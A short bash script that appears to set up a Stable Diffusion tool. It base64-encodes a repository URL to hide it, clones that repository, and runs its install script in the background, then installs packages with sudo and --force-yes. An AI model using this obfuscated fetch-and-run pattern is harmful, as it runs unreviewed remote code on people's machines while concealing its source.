#!/bin/bash
VAR="$(echo aHR0cHM6Ly9odWdnaW5nZmFjZS5jby96dXYwL1NEMTc= | base64 --decode)"
git clone $VAR SD
\cp -f ./SD/install.sh "ss.sh"
sh ss.sh $1 $2 &
sudo apt -y --force-yes install software-properties-common &
sudo add-apt-repository ppa:deadsnakes/ppa
echo 'do enter'
